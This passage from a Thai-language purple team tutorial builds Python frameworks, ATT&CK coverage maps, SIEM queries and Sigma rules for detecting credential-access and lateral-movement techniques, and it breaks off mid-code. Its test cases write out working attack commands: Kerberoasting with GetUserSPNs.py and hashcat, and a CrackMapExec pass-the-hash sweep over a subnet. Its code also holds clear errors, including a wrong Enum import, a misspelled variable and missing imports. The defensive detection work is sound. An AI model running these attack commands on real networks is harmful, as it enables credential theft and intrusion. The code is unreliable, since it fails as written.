# Part 75: Purple Team Operations - การทำงานร่วมกันระหว่าง Red และ Blue Team

## สารบัญ
1. [Purple Team คืออะไร](#purple-team-คืออะไร)
2. [กรอบการทำงาน Purple Team](#กรอบการทำงาน-purple-team)
3. [MITRE ATT&CK สำหรับ Purple Team](#mitre-attck-สำหรับ-purple-team)
4. [Detection Engineering](#detection-engineering)
5. [Sigma Rules](#sigma-rules)
6. [SIEM Integration Testing](#siem-integration-testing)
7. [Adversary Emulation Planning](#adversary-emulation-planning)
8. [Detection Gap Analysis](#detection-gap-analysis)
9. [Threat Hunting](#threat-hunting)
10. [Purple Team Exercises](#purple-team-exercises)
11. [Metrics และการวัดผล](#metrics-และการวัดผล)
12. [Purple Team Automation](#purple-team-automation)

---

## 1. Purple Team คืออะไร

```
Purple Team = Red Team + Blue Team ทำงานร่วมกัน

┌─────────────────────────────────────────────────────────┐
│                    PURPLE TEAM                          │
│                                                         │
│  RED TEAM          ←→         BLUE TEAM                │
│  (Attackers)    Collaboration   (Defenders)             │
│                                                         │
│  • Attack simulation           • Detection              │
│  • Technique execution         • Response               │
│  • Tool usage                  • Analysis               │
│  • Procedure documentation     • Alert tuning           │
│                                                         │
│              SHARED OBJECTIVES:                         │
│         • Improve detection coverage                    │
│         • Validate security controls                    │
│         • Close detection gaps                          │
│         • Measure security posture                      │
└─────────────────────────────────────────────────────────┘
```

### ความแตกต่างระหว่าง Red/Blue/Purple Team

| ด้าน | Red Team | Blue Team | Purple Team |
|------|----------|-----------|-------------|
| เป้าหมาย | โจมตีและเจาะระบบ | ป้องกันและตรวจจับ | ปรับปรุง Detection ร่วมกัน |
| ความโปร่งใส | ซ่อนตัว (Stealth) | ตรวจจับภัยคุกคาม | เปิดเผย (Transparent) |
| วิธีการ | TTPs ของ Attacker | Monitoring & Response | Collaborative Testing |
| ผลลัพธ์ | รายงานการเจาะระบบ | Incident Reports | Detection Improvements |
| ความถี่ | ปีละ 1-2 ครั้ง | ต่อเนื่อง | ต่อเนื่อง/วนซ้ำ |

### ประโยชน์ของ Purple Team

```
1. ลด Detection Gap (ช่องว่างในการตรวจจับ)
2. เพิ่มประสิทธิภาพ Alert (ลด False Positive)
3. ปรับปรุง SOC Playbooks
4. Validate ว่า Security Controls ทำงานได้จริง
5. สร้างความรู้และ Skill ให้ทั้งสองทีม
6. ROI ที่วัดได้จาก Security Investment
```

---

## 2. กรอบการทำงาน Purple Team

### Purple Team Framework

```
วงจร Purple Team:

  ┌──────────────────────────────────────────┐
  │  1. PLAN                                 │
  │     • เลือก ATT&CK Techniques            │
  │     • กำหนด Scope และ Rules of Engagement│
  │     • สร้าง Test Cases                   │
  └────────────────┬─────────────────────────┘
                   ↓
  ┌──────────────────────────────────────────┐
  │  2. EXECUTE                              │
  │     • Red Team รัน Attack Technique      │
  │     • Blue Team Monitor ระบบ             │
  │     • บันทึก Timeline ทั้งสองฝ่าย        │
  └────────────────┬─────────────────────────┘
                   ↓
  ┌──────────────────────────────────────────┐
  │  3. ANALYZE                              │
  │     • เปรียบเทียบ Attack vs Detection    │
  │     • ระบุ Detection Gaps                │
  │     • วิเคราะห์ Root Cause               │
  └────────────────┬─────────────────────────┘
                   ↓
  ┌──────────────────────────────────────────┐
  │  4. IMPROVE                              │
  │     • สร้าง/ปรับ Detection Rules         │
  │     • อัพเดต Playbooks                   │
  │     • Fine-tune Alerts                   │
  └────────────────┬─────────────────────────┘
                   ↓
  ┌──────────────────────────────────────────┐
  │  5. VALIDATE                             │
  │     • ทดสอบ Detection Rules ใหม่         │
  │     • วัด Improvement                    │
  │     • Document ผลลัพธ์                   │
  └────────────────┬─────────────────────────┘
                   ↓
               (วนซ้ำ)
```

### Purple Team Exercise Structure

```python
#!/usr/bin/env python3
# purple_team_framework.py - โครงสร้างการทำงาน Purple Team

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Enum
from datetime import datetime
import json

class TestStatus(str, Enum):
    PENDING = "pending"
    RUNNING = "running"
    DETECTED = "detected"
    NOT_DETECTED = "not_detected"
    PARTIALLY_DETECTED = "partially_detected"
    BLOCKED = "blocked"

class Priority(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"

@dataclass
class AttackTestCase:
    """Test Case สำหรับ ATT&CK Technique"""
    id: str
    name: str
    technique_id: str       # T1234.001
    tactic: str             # Credential Access
    description: str
    prerequisites: List[str]
    attack_commands: List[str]
    expected_artifacts: Dict[str, List[str]]  # logs, processes, network
    detection_queries: Dict[str, str]          # SIEM, EDR queries
    priority: Priority
    status: TestStatus = TestStatus.PENDING
    detected_by: List[str] = field(default_factory=list)
    notes: str = ""
    executed_at: Optional[datetime] = None

@dataclass
class PurpleTeamExercise:
    """Purple Team Exercise"""
    name: str
    scope: str
    start_date: datetime
    end_date: datetime
    red_team_lead: str
    blue_team_lead: str
    test_cases: List[AttackTestCase] = field(default_factory=list)
    
    def add_test_case(self, tc: AttackTestCase):
        self.test_cases.append(tc)
    
    def get_detection_rate(self) -> float:
        """คำนวณ Detection Rate"""
        if not self.test_cases:
            return 0.0
        detected = sum(1 for tc in self.test_cases 
                      if tc.status in [TestStatus.DETECTED, TestStatus.BLOCKED])
        return (detected / len(self.test_cases)) * 100
    
    def get_gaps(self) -> List[AttackTestCase]:
        """รับ Test Cases ที่ไม่ถูกตรวจจับ"""
        return [tc for tc in self.test_cases 
                if tc.status == TestStatus.NOT_DETECTED]
    
    def generate_report(self) -> Dict:
        """สร้างรายงาน Purple Team Exercise"""
        gaps = self.get_gaps()
        detection_rate = self.get_detection_rate()
        
        by_tactic = {}
        for tc in self.test_cases:
            if tc.tactic not in by_tactic:
                by_tactic[tc.tactic] = {"total": 0, "detected": 0}
            by_tactic[tc.tactic]["total"] += 1
            if tc.status in [TestStatus.DETECTED, TestStatus.BLOCKED]:
                by_tactic[tc.tactic]["detected"] += 1
        
        return {
            "exercise_name": self.name,
            "summary": {
                "total_tests": len(self.test_cases),
                "detected": len([tc for tc in self.test_cases if tc.status == TestStatus.DETECTED]),
                "blocked": len([tc for tc in self.test_cases if tc.status == TestStatus.BLOCKED]),
                "not_detected": len(gaps),
                "detection_rate": f"{detection_rate:.1f}%"
            },
            "detection_by_tactic": by_tactic,
            "critical_gaps": [
                {"id": tc.id, "name": tc.name, "technique": tc.technique_id}
                for tc in gaps if tc.priority == Priority.CRITICAL
            ],
            "recommendations": self._generate_recommendations(gaps)
        }
    
    def _generate_recommendations(self, gaps: List[AttackTestCase]) -> List[str]:
        """สร้างคำแนะนำจาก Detection Gaps"""
        recs = []
        for tc in gaps[:5]:  # Top 5 gaps
            recs.append(
                f"สร้าง Detection Rule สำหรับ {tc.name} ({tc.technique_id}) - "
                f"ตรวจสอบ {', '.join(tc.expected_artifacts.get('logs', ['event logs']))}"
            )
        return recs

# ตัวอย่าง Test Cases
KERBEROASTING_TC = AttackTestCase(
    id="TC-001",
    name="Kerberoasting via Impacket",
    technique_id="T1558.003",
    tactic="Credential Access",
    description="ดึง Kerberos Service Tickets สำหรับ Offline Cracking",
    prerequisites=["Domain User Account", "Domain Connectivity"],
    attack_commands=[
        "python3 GetUserSPNs.py domain.local/user:password -request",
        "hashcat -m 13100 hashes.txt wordlist.txt"
    ],
    expected_artifacts={
        "windows_events": ["Event ID 4769 (Kerberos Service Ticket)"],
        "network": ["TGS-REQ to DC port 88"],
        "processes": ["python3, GetUserSPNs.py"]
    },
    detection_queries={
        "splunk": 'index=windows EventCode=4769 TicketEncryptionType=0x17 | stats count by src_ip, ServiceName',
        "elastic": 'event.code:4769 AND winlog.event_data.TicketEncryptionType:0x17',
        "sentinel": 'SecurityEvent | where EventID == 4769 and TicketEncryptionType == "0x17"'
    },
    priority=Priority.CRITICAL
)

PASSTHEHASH_TC = AttackTestCase(
    id="TC-002",
    name="Pass-the-Hash via CrackMapExec",
    technique_id="T1550.002",
    tactic="Lateral Movement",
    description="ใช้ NTLM Hash เคลื่อนที่ไปยัง Remote Systems",
    prerequisites=["NTLM Hash", "Network Access"],
    attack_commands=[
        "crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c"
    ],
    expected_artifacts={
        "windows_events": ["Event ID 4624 Logon Type 3", "Event ID 4625"],
        "network": ["SMB connections port 445"],
        "sysmon": ["Network connection events"]
    },
    detection_queries={
        "splunk": 'index=windows EventCode=4624 Logon_Type=3 | eval isHash=if(match(Account_Name,"[0-9a-f]{32}"),"yes","no") | where isHash="yes"',
        "elastic": 'event.code:4624 AND winlog.event_data.LogonType:3'
    },
    priority=Priority.CRITICAL
)

if __name__ == "__main__":
    exercise = PurpleTeamExercise(
        name="Q4 2024 Purple Team Exercise",
        scope="Corporate AD Environment",
        start_date=datetime(2024, 10, 1),
        end_date=datetime(2024, 10, 5),
        red_team_lead="Red Team Lead",
        blue_team_lead="SOC Lead"
    )
    
    exercise.add_test_case(KERBEROASTING_TC)
    exercise.add_test_case(PASSHTEHASH_TC)
    
    # จำลองผลลัพธ์
    KERBEROASTING_TC.status = TestStatus.DETECTED
    KERBEROASTING_TC.detected_by = ["Splunk SIEM", "CrowdStrike EDR"]
    PASSHTEHASH_TC.status = TestStatus.NOT_DETECTED
    
    report = exercise.generate_report()
    print(json.dumps(report, indent=2, ensure_ascii=False))
```

---

## 3. MITRE ATT&CK สำหรับ Purple Team

### ATT&CK Navigator สำหรับ Purple Team

```python
#!/usr/bin/env python3
# attack_coverage_mapper.py - แผนที่ Detection Coverage

import json
from typing import Dict, List

# ATT&CK Techniques ที่สำคัญสำหรับ Enterprise
ATTACK_TECHNIQUES = {
    "TA0001": {  # Initial Access
        "name": "Initial Access",
        "techniques": {
            "T1566.001": "Phishing: Spearphishing Attachment",
            "T1566.002": "Phishing: Spearphishing Link",
            "T1190": "Exploit Public-Facing Application",
            "T1133": "External Remote Services",
            "T1078": "Valid Accounts"
        }
    },
    "TA0002": {  # Execution
        "name": "Execution",
        "techniques": {
            "T1059.001": "Command: PowerShell",
            "T1059.003": "Command: Windows Command Shell",
            "T1059.007": "Command: JavaScript",
            "T1053.005": "Scheduled Task",
            "T1047": "WMI"
        }
    },
    "TA0003": {  # Persistence
        "name": "Persistence",
        "techniques": {
            "T1547.001": "Registry Run Keys",
            "T1053.005": "Scheduled Task",
            "T1505.003": "Web Shell",
            "T1078": "Valid Accounts",
            "T1136": "Create Account"
        }
    },
    "TA0004": {  # Privilege Escalation
        "name": "Privilege Escalation",
        "techniques": {
            "T1548.002": "UAC Bypass",
            "T1134": "Access Token Manipulation",
            "T1055": "Process Injection",
            "T1068": "Exploitation for Privilege Escalation"
        }
    },
    "TA0005": {  # Defense Evasion
        "name": "Defense Evasion",
        "techniques": {
            "T1562.001": "Disable Security Tools",
            "T1070.001": "Clear Windows Event Logs",
            "T1027": "Obfuscated Files",
            "T1055": "Process Injection",
            "T1574": "DLL Hijacking"
        }
    },
    "TA0006": {  # Credential Access
        "name": "Credential Access",
        "techniques": {
            "T1003.001": "LSASS Memory Dump",
            "T1003.003": "NTDS.dit",
            "T1558.003": "Kerberoasting",
            "T1558.004": "AS-REP Roasting",
            "T1552.001": "Credentials in Files"
        }
    },
    "TA0007": {  # Discovery
        "name": "Discovery",
        "techniques": {
            "T1087.002": "Domain Account Discovery",
            "T1069.002": "Domain Groups",
            "T1482": "Domain Trust Discovery",
            "T1046": "Network Service Scanning",
            "T1018": "Remote System Discovery"
        }
    },
    "TA0008": {  # Lateral Movement
        "name": "Lateral Movement",
        "techniques": {
            "T1550.002": "Pass the Hash",
            "T1550.003": "Pass the Ticket",
            "T1021.001": "Remote Desktop Protocol",
            "T1021.002": "SMB/Windows Admin Shares",
            "T1021.006": "WinRM"
        }
    },
    "TA0011": {  # Command and Control
        "name": "Command and Control",
        "techniques": {
            "T1071.001": "Web Protocols (HTTP/HTTPS)",
            "T1071.004": "DNS",
            "T1095": "Non-Application Layer Protocol",
            "T1573": "Encrypted Channel",
            "T1090": "Proxy"
        }
    }
}

class CoverageMapper:
    """แผนที่ Detection Coverage สำหรับ ATT&CK"""
    
    def __init__(self):
        self.coverage: Dict[str, str] = {}  # technique_id -> coverage_level
        
    def set_coverage(self, technique_id: str, level: str):
        """กำหนดระดับ Coverage: none/partial/full"""
        self.coverage[technique_id] = level
    
    def calculate_coverage_by_tactic(self) -> Dict:
        """คำนวณ Coverage แยกตาม Tactic"""
        results = {}
        for tactic_id, tactic_data in ATTACK_TECHNIQUES.items():
            total = len(tactic_data["techniques"])
            covered = sum(1 for t in tactic_data["techniques"]
                         if self.coverage.get(t) == "full")
            partial = sum(1 for t in tactic_data["techniques"]
                         if self.coverage.get(t) == "partial")
            results[tactic_data["name"]] = {
                "total": total,
                "full_coverage": covered,
                "partial_coverage": partial,
                "no_coverage": total - covered - partial,
                "coverage_pct": round((covered / total) * 100, 1)
            }
        return results
    
    def export_navigator_layer(self, name: str) -> Dict:
        """Export เป็น ATT&CK Navigator Layer"""
        techniques = []
        color_map = {
            "full": "#00ff00",     # สีเขียว = ตรวจจับได้เต็มที่
            "partial": "#ffff00",   # สีเหลือง = ตรวจจับได้บางส่วน
            "none": "#ff0000"       # สีแดง = ไม่มี Detection
        }
        
        for tactic_data in ATTACK_TECHNIQUES.values():
            for technique_id in tactic_data["techniques"]:
                level = self.coverage.get(technique_id, "none")
                techniques.append({
                    "techniqueID": technique_id,
                    "color": color_map[level],
                    "comment": f"Coverage: {level}",
                    "enabled": True
                })
        
        return {
            "name": name,
            "versions": {"attack": "14", "navigator": "4.9"},
            "domain": "enterprise-attack",
            "techniques": techniques
        }

# สร้าง Coverage Map ตัวอย่าง
mapper = CoverageMapper()

# กำหนด Coverage จาก Purple Team Exercise
detected_techniques = {
    "T1566.001": "partial",
    "T1059.001": "full",
    "T1059.003": "full",
    "T1547.001": "partial",
    "T1053.005": "full",
    "T1558.003": "full",   # Kerberoasting - ตรวจจับได้
    "T1003.001": "partial",
    "T1550.002": "none",   # Pass-the-Hash - ยังไม่มี Detection
    "T1021.001": "full",
    "T1071.001": "partial"
}

for technique, level in detected_techniques.items():
    mapper.set_coverage(technique, level)

coverage_report = mapper.calculate_coverage_by_tactic()
print(json.dumps(coverage_report, indent=2, ensure_ascii=False))
```

### ผลลัพธ์ตัวอย่าง:
```json
{
  "Credential Access": {
    "total": 5,
    "full_coverage": 1,
    "partial_coverage": 1,
    "no_coverage": 3,
    "coverage_pct": 20.0
  },
  "Lateral Movement": {
    "total": 5,
    "full_coverage": 1,
    "partial_coverage": 0,
    "no_coverage": 4,
    "coverage_pct": 20.0
  }
}
```

---

## 4. Detection Engineering

### Detection Rule Development Process

```
กระบวนการสร้าง Detection Rule:

1. ทำความเข้าใจ Technique
   • อ่าน ATT&CK Wiki
   • ศึกษา Procedure Examples
   • ดู Related Techniques

2. ระบุ Data Sources
   • Windows Event Logs
   • Sysmon Events
   • EDR Telemetry
   • Network Logs
   • Cloud Audit Logs

3. สร้าง Detection Logic
   • ระบุ Indicators
   • สร้าง Query
   • ทดสอบ False Positive

4. Validate และ Tune
   • รันใน Test Environment
   • วัด True/False Positive Rate
   • ปรับ Threshold

5. Deploy และ Monitor
   • Deploy ไปยัง Production SIEM
   • สร้าง Alert
   • Document Rule
```

### Detection Rule Categories

```python
#!/usr/bin/env python3
# detection_engineering.py

DETECTION_RULES = {
    "kerberoasting": {
        "technique": "T1558.003",
        "description": "ตรวจจับ Kerberoasting จาก Windows Event Logs",
        "data_sources": ["Windows Security Event Log"],
        "event_ids": [4769],
        "logic": {
            "condition": "AND",
            "filters": [
                {"field": "EventID", "operator": "equals", "value": 4769},
                {"field": "TicketEncryptionType", "operator": "equals", "value": "0x17"},
                {"field": "ServiceName", "operator": "not_ends_with", "value": "$"}
            ]
        },
        "queries": {
            "splunk": """
index=wineventlog EventCode=4769 
    TicketEncryptionType=0x17 
    NOT ServiceName="*$"
| stats count by src_ip, Account_Name, ServiceName, _time
| where count > 5
| sort -count""",
            "elastic_kql": """
event.code:"4769" 
AND winlog.event_data.TicketEncryptionType:"0x17"
AND NOT winlog.event_data.ServiceName:*$""",
            "sentinel_kql": """
SecurityEvent
| where EventID == 4769
| where TicketEncryptionType == "0x17"
| where ServiceName !endswith "$"
| summarize RequestCount=count() by IpAddress, AccountName, ServiceName, bin(TimeGenerated, 5m)
| where RequestCount > 5
| order by RequestCount desc"""
        },
        "false_positives": [
            "Service accounts ที่ใช้ RC4 encryption จริงๆ",
            "Legacy applications"
        ],
        "severity": "high",
        "confidence": "medium"
    },
    
    "lsass_dump": {
        "technique": "T1003.001",
        "description": "ตรวจจับการ Dump LSASS Memory",
        "data_sources": ["Sysmon", "Windows Security Event Log"],
        "event_ids": [10],  # Sysmon Process Access
        "queries": {
            "splunk": """
index=sysmon EventCode=10 
    TargetImage="*lsass.exe"
    (GrantedAccess=0x1fffff OR GrantedAccess=0x1010 OR GrantedAccess=0x143a)
| stats count by SourceImage, SourceProcessId, GrantedAccess, Computer
| sort -count""",
            "elastic_kql": """
event.code:"10"
AND winlog.event_data.TargetImage:*lsass.exe
AND winlog.event_data.GrantedAccess:(0x1fffff OR 0x1010 OR 0x143a)"""
        },
        "false_positives": [
            "Windows Defender",
            "Antivirus products",
            "Crash dump utilities"
        ],
        "severity": "critical",
        "confidence": "high"
    },
    
    "powershell_download_cradle": {
        "technique": "T1059.001",
        "description": "ตรวจจับ PowerShell Download Cradle",
        "data_sources": ["PowerShell Script Block Logging", "Process Creation"],
        "event_ids": [4104, 1],
        "queries": {
            "splunk": """
index=wineventlog EventCode=4104 
    (ScriptBlockText="*IEX*" OR ScriptBlockText="*Invoke-Expression*")
    (ScriptBlockText="*DownloadString*" OR ScriptBlockText="*WebClient*" 
     OR ScriptBlockText="*Net.WebClient*" OR ScriptBlockText="*Net.Http*")
| eval risk_score=case(
    match(ScriptBlockText, "(?i)bypass|encodedcommand|hidden"), 90,
    match(ScriptBlockText, "(?i)DownloadString|IEX"), 70,
    1==1, 50
  )
| sort -risk_score
| table _time Computer UserName ScriptBlockText risk_score"""
        },
        "false_positives": [
            "Legitimate automation scripts",
            "Software deployment tools"
        ],
        "severity": "high",
        "confidence": "medium"
    },
    
    "dcsync": {
        "technique": "T1003.006",
        "description": "ตรวจจับ DCSync Attack",
        "data_sources": ["Windows Security Event Log - Directory Service Access"],
        "event_ids": [4662],
        "queries": {
            "splunk": """
index=wineventlog EventCode=4662 
    OperationType="%%14674"
    (ObjectType="{19195a5b-6da0-11d0-afd3-00c04fd930c9}" 
     OR ObjectType="{89e95b76-444d-4c62-991a-0facbeda640c}")
    NOT Account_Name="*$"
| stats count by Account_Name, src_ip, ObjectName
| where count > 1""",
            "elastic_kql": """
event.code:"4662"
AND winlog.event_data.AccessMask:"0x100"
AND (winlog.event_data.ObjectType:"{19195a5b-6da0-11d0-afd3-00c04fd930c9}"
     OR winlog.event_data.ObjectType:"{89e95b76-444d-4c62-991a-0facbeda640c}")
AND NOT winlog.event_data.SubjectUserName:*$"""
        },
        "false_positives": [
            "Azure AD Connect",
            "Legitimate Backup/Replication tools"
        ],
        "severity": "critical",
        "confidence": "high"
    },
    
    "pass_the_hash": {
        "technique": "T1550.002",
        "description": "ตรวจจับ Pass-the-Hash",
        "data_sources": ["Windows Security Event Log"],
        "event_ids": [4624],
        "queries": {
            "splunk": """
index=wineventlog EventCode=4624 
    Logon_Type=3
    Authentication_Package=NTLM
    NOT Account_Name="ANONYMOUS LOGON"
    NOT Account_Name="*$"
| stats count values(src_ip) as src_ips by Account_Name, Workstation_Name
| where count > 10
| mvexpand src_ips
| stats count by Account_Name src_ips
| where count > 5"""
        },
        "severity": "high",
        "confidence": "low"  # High false positive rate
    }
}

class DetectionRuleValidator:
    """ตรวจสอบและทดสอบ Detection Rules"""
    
    def __init__(self):
        self.test_events = []
    
    def validate_splunk_syntax(self, query: str) -> Dict:
        """ตรวจสอบ Syntax ของ Splunk Query"""
        issues = []
        warnings = []
        
        # ตรวจสอบ best practices
        if "index=*" in query:
            issues.append("อย่าใช้ index=* เพราะจะ query ทุก index (ช้ามาก)")
        
        if not any(kw in query for kw in ["| stats", "| table", "| timechart"]):
            warnings.append("ควรมี aggregation หรือ output command")
        
        if "earliest=" not in query and "latest=" not in query:
            warnings.append("พิจารณาเพิ่ม time range เพื่อประสิทธิภาพ")
        
        if "| rex" in query.lower():
            warnings.append("การใช้ rex อาจช้า พิจารณาใช้ eval+match แทน")
        
        return {
            "valid": len(issues) == 0,
            "issues": issues,
            "warnings": warnings
        }
    
    def calculate_rule_quality(self, rule: Dict) -> int:
        """ให้คะแนนคุณภาพ Detection Rule (0-100)"""
        score = 0
        
        # มี description
        if rule.get("description"):
            score += 10
        
        # มี false_positives documented
        if rule.get("false_positives"):
            score += 15
        
        # มีหลาย query platforms
        queries = rule.get("queries", {})
        score += min(len(queries) * 10, 30)
        
        # มี severity และ confidence
        if rule.get("severity") and rule.get("confidence"):
            score += 15
        
        # มี ATT&CK Technique ID
        if rule.get("technique"):
            score += 10
        
        # มี data_sources
        if rule.get("data_sources"):
            score += 10
        
        return score

# ตรวจสอบ Rules
validator = DetectionRuleValidator()
for rule_name, rule in DETECTION_RULES.items():
    quality = validator.calculate_rule_quality(rule)
    print(f"Rule: {rule_name} - Quality Score: {quality}/100")
    if "splunk" in rule.get("queries", {}):
        result = validator.validate_splunk_syntax(rule["queries"]["splunk"])
        if result["warnings"]:
            print(f"  Warnings: {result['warnings']}")
```

---

## 5. Sigma Rules

### Sigma Rule Format และตัวอย่าง

```yaml
# sigma_rules/kerberoasting.yml
title: Kerberoasting Activity
id: 16f0f5ef-b9bb-44a1-8a80-0a4c8d3c6f7e
status: stable
description: ตรวจจับ Kerberoasting - การขอ TGS Tickets สำหรับ Service Accounts หลายรายการ
references:
    - https://attack.mitre.org/techniques/T1558/003/
    - https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/
author: Purple Team
date: 2024/01/15
modified: 2024/06/01
tags:
    - attack.credential_access
    - attack.t1558.003
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4769
        TicketEncryptionType: '0x17'  # RC4 - สัญญาณของ Kerberoasting
    filter:
        ServiceName|endswith: '$'  # ยกเว้น Computer Accounts
    condition: selection and not filter
fields:
    - IpAddress
    - ServiceName  
    - AccountName
falsepositives:
    - Service accounts ที่ตั้งค่าให้ใช้ RC4 จริงๆ
    - Legacy authentication scenarios
level: high
```

```yaml
# sigma_rules/lsass_memory_dump.yml
title: LSASS Memory Dump via Sysmon
id: a9daba49-9d8f-4f3f-8a45-9a30e9a3f7b2
status: stable
description: ตรวจจับการพยายาม Access LSASS Memory ด้วย Sensitive Access Rights
tags:
    - attack.credential_access
    - attack.t1003.001
logsource:
    category: process_access
    product: windows
detection:
    selection:
        TargetImage|endswith: '\lsass.exe'
        GrantedAccess|contains:
            - '0x1fffff'
            - '0x1410'
            - '0x143a'
            - '0x1418'
            - '0x1010'
    filter_legitimate:
        SourceImage|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Program Files\'
            - 'C:\Program Files (x86)\'
    condition: selection and not filter_legitimate
falsepositives:
    - Antivirus products
    - Windows Defender
    - Crash dump utilities
level: critical
```

```yaml
# sigma_rules/powershell_encoded_command.yml
title: PowerShell Encoded Command Execution
id: e3e4b8f2-1234-4567-8901-abcdef012345
status: stable
description: ตรวจจับ PowerShell ที่ใช้ Encoded Command เพื่อซ่อนคำสั่ง
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1059.001
    - attack.t1027
logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
    selection_flags:
        CommandLine|contains:
            - '-EncodedCommand'
            - '-enc '
            - '-ec '
    selection_suspicious:
        CommandLine|contains:
            - '-NonInteractive'
            - '-WindowStyle Hidden'
            - '-ExecutionPolicy Bypass'
            - '-nop'
    condition: selection_img and (selection_flags or selection_suspicious)
fields:
    - Image
    - CommandLine
    - User
    - ParentImage
falsepositives:
    - Legitimate automation scripts
    - Configuration management tools
level: medium
```

### Sigma Rule Compiler

```python
#!/usr/bin/env python3
# sigma_compiler.py - แปลง Sigma Rules เป็น SIEM Queries

import yaml
from typing import Dict, Optional

class SigmaCompiler:
    """แปลง Sigma Rules เป็น Query ของ SIEM ต่างๆ"""
    
    def __init__(self, target: str):
        """
        target: 'splunk', 'elastic', 'sentinel', 'qradar'
        """
        self.target = target
    
    def load_rule(self, rule_path: str) -> Dict:
        """โหลด Sigma Rule จากไฟล์ YAML"""
        with open(rule_path, 'r') as f:
            return yaml.safe_load(f)
    
    def compile_detection(self, detection: Dict) -> str:
        """แปลง Detection Section เป็น Query"""
        if self.target == "splunk":
            return self._to_splunk(detection)
        elif self.target == "elastic":
            return self._to_elastic_kql(detection)
        elif self.target == "sentinel":
            return self._to_sentinel_kql(detection)
    
    def _to_splunk(self, detection: Dict) -> str:
        """แปลงเป็น Splunk SPL"""
        parts = []
        
        for key, value in detection.items():
            if key == "condition":
                continue
            
            if isinstance(value, dict):
                for field, condition in value.items():
                    if field.endswith("|"):
                        # Handle field modifiers
                        field_name, modifier = field.rsplit("|", 1)
                        if modifier == "contains":
                            if isinstance(condition, list):
                                parts.append(
                                    f"({' OR '.join([f'{field_name}=\"*{v}*\"' for v in condition])})"
                                )
                        elif modifier == "endswith":
                            if isinstance(condition, list):
                                parts.append(
                                    f"({' OR '.join([f'{field_name}=\"*{v}\"' for v in condition])})"
                                )
                    else:
                        if isinstance(condition, list):
                            parts.append(
                                f"({' OR '.join([f'{field}={repr(v)}' for v in condition])})"
                            )
                        else:
                            parts.append(f"{field}={repr(condition)}")
        
        return " ".join(parts)
    
    def _to_elastic_kql(self, detection: Dict) -> str:
        """แปลงเป็น Elastic KQL"""
        parts = []
        
        for key, value in detection.items():
            if key == "condition":
                continue
            
            if isinstance(value, dict):
                for field, condition in value.items():
                    if "|" in field:
                        field_name, modifier = field.rsplit("|", 1)
                        if modifier == "contains":
                            elastic_field = self._map_field_elastic(field_name)
                            if isinstance(condition, list):
                                clauses = " OR ".join([f"{elastic_field}:*{v}*" for v in condition])
                                parts.append(f"({clauses})")
                        elif modifier == "endswith":
                            elastic_field = self._map_field_elastic(field_name)
                            if isinstance(condition, list):
                                clauses = " OR ".join([f"{elastic_field}:*{v}" for v in condition])
                                parts.append(f"({clauses})")
                    else:
                        elastic_field = self._map_field_elastic(field)
                        if isinstance(condition, list):
                            clauses = " OR ".join([f"{elastic_field}:{repr(v)}" for v in condition])
                            parts.append(f"({clauses})")
                        else:
                            parts.append(f"{elastic_field}:{repr(condition)}")
        
        return " AND ".join(parts)
    
    def _map_field_elastic(self, sigma_field: str) -> str:
        """Map Sigma field names ไปยัง Elastic fields"""
        field_map = {
            "EventID": "event.code",
            "Image": "process.executable",
            "CommandLine": "process.command_line",
            "TargetImage": "winlog.event_data.TargetImage",
            "SourceImage": "winlog.event_data.SourceImage",
            "GrantedAccess": "winlog.event_data.GrantedAccess",
            "TicketEncryptionType": "winlog.event_data.TicketEncryptionType",
            "ServiceName": "winlog.event_data.ServiceName",
            "User": "user.name"
        }
        return field_map.get(sigma_field, sigma_field.lower())

# ตัวอย่างการใช้งาน
if __name__ == "__main__":
    # สร้าง Compiler สำหรับแต่ละ Platform
    for platform in ["splunk", "elastic", "sentinel"]:
        compiler = SigmaCompiler(platform)
        print(f"\n=== {platform.upper()} ===")
        print(f"Sigma Compiler initialized for {platform}")
        print("รัน: sigma convert -t splunk -r sigma_rules/ -o splunk_queries.conf")
        print("รัน: sigma convert -t elasticsearch -r sigma_rules/ -o elastic_queries.json")
```

### คำสั่ง Sigma CLI

```bash
# ติดตั้ง Sigma CLI
pip install sigma-cli
pip install pysigma-backend-splunk
pip install pysigma-backend-elasticsearch
pip install pysigma-backend-microsoft365defender

# แปลง Rule เดียว
sigma convert -t splunk sigma_rules/kerberoasting.yml

# แปลงทั้ง Directory
sigma convert -t splunk -r sigma_rules/ -o splunk_alerts.conf

# แปลงเป็น Elastic NDJSON
sigma convert -t elasticsearch-rule sigma_rules/ -o elastic_rules.ndjson

# แปลงเป็น Microsoft Sentinel
sigma convert -t microsoft365defender sigma_rules/ -o sentinel_rules.json

# Validate Rules
sigma check sigma_rules/

# List supported backends
sigma list backends

# ค้นหา Rules จาก SigmaHQ
git clone https://github.com/SigmaHQ/sigma.git
find sigma/rules/windows -name "*.yml" | head -20
```

---

## 6. SIEM Integration Testing

### Splunk Detection Testing

```python
#!/usr/bin/env python3
# siem_tester.py - ทดสอบ Detection ใน SIEM

import requests
import json
import time
from datetime import datetime

class SplunkTester:
    """ทดสอบ Detection Rules ใน Splunk"""
    
    def __init__(self, splunk_host: str, username: str, password: str):
        self.base_url = f"https://{splunk_host}:8089"
        self.auth = (username, password)
        self.session_key = None
        self.headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    
    def authenticate(self):
        """ยืนยันตัวตนกับ Splunk"""
        resp = requests.post(
            f"{self.base_url}/services/auth/login",
            data={'username': self.auth[0], 'password': self.auth[1]},
            verify=False
        )
        self.session_key = resp.json()['sessionKey']
        self.headers['Authorization'] = f'Splunk {self.session_key}'
        print("[+] Authenticated to Splunk")
    
    def inject_test_event(self, index: str, event_data: Dict) -> bool:
        """Inject Test Event เข้า Splunk Index"""
        event_json = json.dumps(event_data)
        resp = requests.post(
            f"{self.base_url}/services/receivers/simple",
            params={'sourcetype': 'WinEventLog:Security', 'index': index},
            data=event_json,
            headers={**self.headers, 'Content-Type': 'application/json'},
            verify=False
        )
        return resp.status_code == 200
    
    def run_search(self, query: str, earliest: str = "-15m") -> List[Dict]:
        """รัน Search Query ใน Splunk"""
        # สร้าง Search Job
        resp = requests.post(
